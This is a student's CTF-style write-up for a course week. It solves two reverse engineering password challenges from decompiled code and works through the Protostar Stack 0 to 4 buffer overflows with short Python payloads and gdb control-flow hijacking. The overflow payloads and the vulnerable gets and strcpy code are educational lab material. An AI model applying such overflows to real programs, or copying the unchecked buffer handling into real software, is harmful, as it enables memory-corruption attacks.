# Writeups for CSOC-week 4

---

# Reverse Engineering

---

## Part 1: Getting to the Low Level 

---

### Challenge 1 :

[Challenge file](https://github.com/tig-paul/CSOC-2024/blob/main/Challs_week%204.1/chall_1)

### Challenge goal :

To find the password.

### Writeup :

First I decompiled the file contents from [dogbolt.org](https://dogbolt.org/?id=41402d48-fc42-44e1-953b-53aeb5607b4a#Snowman=190&Ghidra=180&angr=137&BinaryNinja=139&dewolf=48&Hex-Rays=10&RetDec=9&rev.ng=127&RecStudio=204&Relyze=157) using **Relyze**. The decompiled file is [here](https://github.com/tig-paul/CSOC-2024/blob/main/Challs_week%204.1/Chall_1_decompiled). Now, let's dive into the main part -

```c
int32_t __cdecl main( void )
{
    uint64_t local_0x118; // [rsp-280]
    uint64_t local_0x10; // [rsp-16]
    void * fs; // fs
    unsigned long v1; // rax
    int32_t v2; // rax

    local_0x10 = *((uint8_t *)fs + 40);
    printf_2( "What is the password:" );
    fgets_2( &local_0x118, 256, stdin );
    v1 = strcspn_2( &local_0x118, &data_0x201A );
    *(&local_0x118 + v1) = 0;
    v2 = check( &local_0x118 );
    if( v2 == 1 ) {
        puts_2( "Correct" );
    } else {
        puts_2( "Incorrect" );
    }
    if( *((uint8_t *)fs + 40) != local_0x10 ) {
        __stack_chk_fail_2();
        // Note: Program behavior is undefined if control flow reaches this location.
        return;
    }
    return 0;
}

// VA=0x12a6
int32_t __cdecl check( int64_t p1 )
{
    unsigned long v1; // rax
    int32_t v2; // rax

    v1 = strlen_2( p1 );
    if( v1 == 10 && *p1 == 49 && *(p1 + 4) == 57 ) {
        v2 = 1;
    } else {
        v2 = 0;
    }
    return v2;
}
```

The script is taking the user input and storing it in the variable `local_0x118` and passing it in the `check` function. In the `if` block it is checking the following conditions -

1. The password string has 10 characters.
2. The first character is `1` since its ascii value is 49
3. The fifth character is `9` since its ascii value is 57

If the conditions are met, then return 1, that means the password is correct.

So, a possible guess can be `1023934652`. Now, I executed the file and gave the aforementioned password and it says correct.

### Challenge 2 :

[Challenge file](https://github.com/tig-paul/CSOC-2024/blob/main/Challs_week%204.1/chall_2)

### Challenge goal :

To find the password.

### Writeup :

For this challenge again I used [dogbolt.org](https://dogbolt.org/?id=41402d48-fc42-44e1-953b-53aeb5607b4a#Snowman=190&Ghidra=180&angr=137&BinaryNinja=139&dewolf=48&Hex-Rays=10&RetDec=9&rev.ng=127&RecStudio=204&Relyze=157) but this time I had to deal with several decompilers to get the password. I discovered that the [decompiled file](https://github.com/tig-paul/CSOC-2024/blob/main/Challs_week%204.1/Chall_2_dec(hex-rays)) by **hex-rays** was the simplest. So, I proceeded with that. The `main` and `checkPassword` functions are -

```c++
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  const char *v4; // rax
  __int64 v5; // rax
  char v7[32]; // [rsp+0h] [rbp-50h] BYREF
  char v8[48]; // [rsp+20h] [rbp-30h] BYREF

  std::string::basic_string(v7);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Enter the password:");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v7);
  std::string::basic_string(v8, v7);
  if ( (unsigned __int8)checkPassword((__int64)v8) )
    v4 = "Login successful";
  else
    v4 = "Login failed";
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, v4);
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  std::string::~string(v8);
  std::string::~string(v7);
  return 0;
}

__int64 __fastcall checkPassword(__int64 a1)
{
  unsigned int v1; // r12d
  __int64 v2; // rdx
  char *v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rax
  int v6; // ebx
  char v8[32]; // [rsp+10h] [rbp-60h] BYREF
  char v9[35]; // [rsp+30h] [rbp-40h] BYREF
  char v10; // [rsp+53h] [rbp-1Dh] BYREF
  int v11; // [rsp+54h] [rbp-1Ch]
  int v12; // [rsp+58h] [rbp-18h]
  int i; // [rsp+5Ch] [rbp-14h]

  std::allocator<char>::allocator(&v10);
  std::string::basic_string(v9, &unk_2005, &v10);
  std::allocator<char>::~allocator(&v10);
  v12 = -7;
  v11 = std::string::length(v9);
  v2 = std::string::length(a1);
  if ( v2 != -v12 )
    goto LABEL_11;
  std::string::basic_string(v8);
  for ( i = 0; i < v11; ++i )
  {
    if ( i == v11 - 1 )
    {
      std::string::operator+=(v8, &unk_2009);
      std::string::operator+=(v8, &unk_200B);
    }
    v3 = (char *)std::string::at(v9, i);
    std::string::operator+=(v8, (unsigned int)*v3);
  }
  v4 = std::string::end(a1);
  v5 = std::string::begin(a1);
  std::reverse<__gnu_cxx::__normal_iterator<char *,std::string>>(v5, v4);
  if ( std::operator==<char>(a1, (__int64)v8) )
  {
    v1 = 1;
    v6 = 0;
  }
  else
  {
    v6 = 1;
  }
  std::string::~string(v8);
  if ( v6 == 1 )
LABEL_11:
    v1 = 0;
  std::string::~string(v9);
  return v1;
}
```

The `main` function first asks to `Enter the password` and takes the user input in `v7`. Then copies it to `v8` and calls the function `checkPassword` with v8 as the argument. If it returns 1, then prints `Login successful` otherwise `Login failed`. Now lets hop on to the `checkPassword` function. `a1` is the parameter that is the user input. It declares several variables. Then creates an allocator `v10` to copy the contents of the unknown variable `unk_2005` into `v9`. Then checks whether the length of the input string is 7 or not. If not, then returns 0. Then it copies the contents of `v9`, `unk_2009` and `unk_200B` into `v8` in some awkword manner. After that, reverses the `a1` string and compares it with `v8` and if they are same, returns 1.

Now, the main problem is that, we don't know the value of `unk_2005`, `unk_2009` and `unk_200B`. If we get them, then we can make `v8` and thus get `a1` by reversing it. So, I searched other tools and from the [decompiled](https://github.com/tig-paul/CSOC-2024/blob/main/Challs_week%204.1/Chall_2_dec(snowman)) file using **snowman**, I found them to be '**dec**', '**k**' and '**car**' respectively.

So, `v8` should be '**dekcarc**' and `a1` should be its reverse that is '**cracked**'. Now, I executed the challenge file with password=`'cracked'` and it said **Login successful**.


---

## Part 2: Memory Corruption

---

## Stack 0:

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

### Writeup:

I simply created a file named `stack_0.c` and wrote the source code. Then I compiled it using **gcc**, executed it and gave the argument '**abcd**' but it replied `Try again?`. Then I read the code and searched about **volatile** and **gets** and how the stack variables are laid out. And found that the `gets` function is vulnurable towards stack overflow.

Now the gets function is taking the user input for the buffer array which have size of 64 bytes. So, to overflow the stack, I gradually increased the input string length and checked the output and when I provided a 70 length string, it gave the output `you have changed the 'modified' variable`.

Exploit:

```py
var = 'x'*70
print(var)
```

![Alt text](https://github.com/tig-paul/CSOC-2024/blob/main/Writeup_files/image-50.png)

## Stack 1:

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### Writeup:

The hexadecimal values of 'a', 'b', 'c' and 'd' are `0x61`, `0x62`, `0x63` and `0x64` respectively and protostar is in little endian. So, `0x61626364` in little endian would be `dcba`. I compiled and executed the given code with several arguments and when I tried with first 64 random characters and next 4 characters as **dcba** but it didn't work. Next I added 4 more random characters and this time got `you have correctly got the variable to the right value`.

Exploit:

```py
var = 'x'*68 + 'dcba'
print(var)
```

![Alt text](https://github.com/tig-paul/CSOC-2024/blob/main/Writeup_files/image-51.png)

## Stack 2:

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### Writeup:

I compiled and executed normally and it showed `please set the GREENIE environment variable`. Then I searched about the `getenv` function and how to set the environment variables. Also went through the source code to understand what is happenning and how the value of the `GREENIE` variable is effecting the `modified` variable. Then I made this exploit:

```py
var = "x"*68 + "\x0a\x0d\x0a\x0d"
print (var)
```

Then exported the **GREENIE** variable and executed the compiled binary.

![Alt text](https://github.com/tig-paul/CSOC-2024/blob/main/Writeup_files/image-52.png)

## Stack 3:

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### Writeup:

First I used `objdump -d stack_3.out` to search for the `win` function in the memory and found its address to be `0x0000000000400704`. Then I made this exploit to overflow the stack and store the address of the `win` function in `fp`. Then it will call `win` to print the message. 

```py
var = 'x'*64 + '\x04\x07\x40\x00'
print(var)
```

![Alt text](https://github.com/tig-paul/CSOC-2024/blob/main/Writeup_files/image-53.png)

## Stack 4:

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### Writeup:

I first watched [this](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=7s) video and several others to understand how the memory works. Then I played with gdb and objdump to find out a way how to anyhow go to the memory address of the `win` function.

From the video, I got the hint to overwrite the return value of the `main` function to the address of the `win` function. First I used `objdump -d stack_4.out` and found the address of the `win` function to be `0x00000000004006c4`. Next, I opened the compiled binary with **gdb**, disassembled main and set a breakpoint in the previous address from the return address.

![Alt text](https://github.com/tig-paul/CSOC-2024/blob/main/Writeup_files/image-54.png)

Then ran the program and gave a random string as input. Then checked the registers.

![Alt text](https://github.com/tig-paul/CSOC-2024/blob/main/Writeup_files/image-55.png)

And set the program counter(pc) at the address of `win`. Then continued with `ni` and finally got the message `code flow successfully changed`.

![Alt text](https://github.com/tig-paul/CSOC-2024/blob/main/Writeup_files/image-56.png)